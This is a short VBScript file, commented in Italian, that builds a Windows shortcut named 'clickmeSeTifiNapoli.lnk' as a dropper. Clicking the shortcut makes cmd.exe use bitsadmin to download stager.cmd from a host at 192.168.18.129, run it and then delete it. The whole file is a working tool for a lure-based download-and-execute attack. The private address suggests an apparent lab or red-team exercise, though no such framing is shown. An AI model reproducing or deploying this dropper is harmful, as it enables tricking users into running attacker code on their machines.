'Lanciare dal terminale con: cscript create_dropper_lnk.vbs

Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "clickmeSeTifiNapoli.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\Windows\System32\cmd.exe"
oLink.Arguments = "/c bitsadmin /transfer mystager /priority FOREGROUND http://192.168.18.129/stager.cmd  C:\Users\Public\Libraries\stager.cmd & call C:\Users\Public\Libraries\stager.cmd & del C:\Users\Public\Libraries\stager.cmd"
oLink.Save

